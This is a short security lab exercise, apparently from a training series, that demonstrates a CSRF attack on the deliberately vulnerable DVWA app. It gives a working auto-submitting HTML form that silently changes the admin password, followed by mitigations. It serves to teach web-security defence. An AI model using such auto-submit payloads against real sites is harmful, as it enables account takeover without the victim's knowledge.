## 🔍 Lab 5: CSRF – Silent Admin Takeover

### 💼 Scenario

An admin password change form lacks CSRF protection. A malicious site silently submits the form.
### 🎯 Objective

Trigger a CSRF attack to change the admin password.

### 🧪 Steps

1. Create an HTML file:

```html
<form action="http://localhost:8080/vulnerabilities/csrf/" method="POST">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```
2. Host it or open in browser while DVWA is logged in.
3. Visit the malicious file → password changed silently.

### 🧠 Real-World Context

CSRF is often overlooked in internal tools or forms assumed to be “safe” due to authentication.

### 🛡️ Mitigation

- Use CSRF tokens in forms.
- Set SameSite attribute on cookies.
- Validate request origin and referrer.